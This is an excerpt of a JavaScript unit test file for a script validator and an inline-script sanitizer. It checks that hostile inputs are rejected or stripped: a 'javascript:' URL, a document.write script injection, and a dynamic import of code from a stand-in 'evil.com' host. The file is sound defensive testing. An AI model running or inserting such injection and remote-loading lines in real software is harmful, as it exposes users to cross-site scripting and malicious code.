...
describe('validateScriptCode', () => {
  describe('Safe code patterns', () => {
    ...
    it('should pass validation for safe variable assignment', () => {
      const result = validateScriptCode('window.__APP_CONFIG__ = { apiUrl: "/api" }');
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  ...
  describe('Dangerous code patterns', () => {
    ...
    it('should fail validation for javascript: protocol', () => {
      const result = validateScriptCode('location.href = "javascript:alert(1)"');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
    ...
    it('should fail validation for document.write', () => {
      const result = validateScriptCode('document.write("<script>evil</script>")');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('should fail validation for dynamic imports', () => {
      const result = validateScriptCode('import("https://evil.com/malware.js")');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });
...
describe('createInlineScript', () => {
  ...
  describe('With sanitization enabled', () => {
    it('should sanitize script tags before validation', () => {
      ...
      expect(result.dangerouslySetInnerHTML.__html).toContain('console.log("safe")');
    });
    ...
    it('should sanitize javascript: protocol', () => {
      const result = createInlineScript('const safe = "data"; javascript:alert(1)', mockNonce, {
        allowSanitization: true,
      });
      expect(result.dangerouslySetInnerHTML.__html).not.toContain('javascript:');
    });
  });
